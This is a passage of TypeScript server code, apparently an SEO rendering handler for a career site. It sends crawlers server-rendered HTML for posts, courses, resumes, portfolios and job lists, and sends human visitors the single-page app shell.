        const parts = path.replace(/^\//, "").split("/");
        
        let language = "en";
        let routeParts = parts;

        // Check for language prefix (e.g., /zh/community/...)
        const SUPPORTED_LANGS = ["es", "fr", "de", "zh", "ja", "ko"];
        if (SUPPORTED_LANGS.includes(parts[0])) {
            language = parts[0];
            routeParts = parts.slice(1);
        }

        const routeType = routeParts[0]; // e.g. "community", "shared", "portfolio", "whiteboard"

        // ── Human traffic: serve the SPA's index.html directly ───────────
        if (!isbot(ua)) {
            try {
                const indexHtml = await getIndexHtml();
                // Inject language to html tag if needed, but SPA usually handles this
                res.set("Cache-Control", "public, max-age=300, s-maxage=600");
                res.status(200).type("html").send(indexHtml);
            } catch {
                res.status(200).type("html").send(
                    `<!DOCTYPE html><html lang="${language}"><head><meta charset="UTF-8"/><meta name="viewport" content="width=device-width,initial-scale=1.0"/><title>CareerVivid</title><script type="module" src="/assets/main.js"></script></head><body><div id="root"></div></body></html>`
                );
            }
            return;
        }

        // ── Bot traffic: generate rich HTML ──────────────────────────────
        try {
            let html: string;

            if (routeType === "community" && routeParts[1] === "post" && routeParts[2]) {
                html = await handleArticle(routeParts[2]);
            } else if (routeType === "community" && !routeParts[1]) {
                html = await handleCommunityFeed();
            // Any /learning/* path renders: known courses get their own page,
            // everything else falls back to the catalog. Hosting rewrites the
            // whole subtree here, so a hardcoded slug list meant real routes
            // like /learning/system-design-interview and /learning/ccaf-quest
            // answered 404 to crawlers.
            } else if (routeType === "learning") {
                html = handleLearningPage(routeParts[1]);
            } else if (routeType === "shared" && routeParts[1] && routeParts[2]) {
                html = await handleResume(routeParts[1], routeParts[2]);
            } else if (routeType === "portfolio" && routeParts[1]) {
                html = await handlePortfolio(routeParts[1]);
            } else if (routeType === "whiteboard") {
                html = await handleWhiteboard(routeParts.slice(1));
            /*
             * /jobs and /jobs/{n}. Matched before getSearchPage because only
             * page one is in SEARCH_PAGES.
             *
             * Digits only. /jobs/{slug} is the employer job board and
             * /jobs/recommend is the signed-in feed; neither belongs here, and
             * a loose match would have served the job list under a company's
             * URL.
             */
            } else if (routeType === "jobs" && (!routeParts[1] || /^\d+$/.test(routeParts[1]))) {
                html = await handleJobsList(routeParts[1]);
            } else if (language === "en") {
                const page = getSearchPage(path);
                if (!page) {
                    res.status(404).send("Not Found");
                    return;
                }
                html = handleStaticPage(page);
            } else {
                res.status(404).send("Not Found");
                return;
            }

            // Set the correct lang attribute in the generated HTML
            html = html.replace('<html lang="en">', `<html lang="${language}">`);

            // Default cache: 5 min client, 10 min CDN
            if (!res.getHeader("Cache-Control")) {
                res.set("Cache-Control", "public, max-age=300, s-maxage=600");
            }
            res.set("X-Rendered-By", "renderSeoContent");
            res.status(200).type("html").send(html);

        } catch (err: any) {
            if (err.message === "not_found") {
                res.status(404).send("Content not found.");
            } else {
                console.error("[renderSeoContent] Error:", err);
                res.status(500).send("Internal Server Error");
            }
        }
    }
);
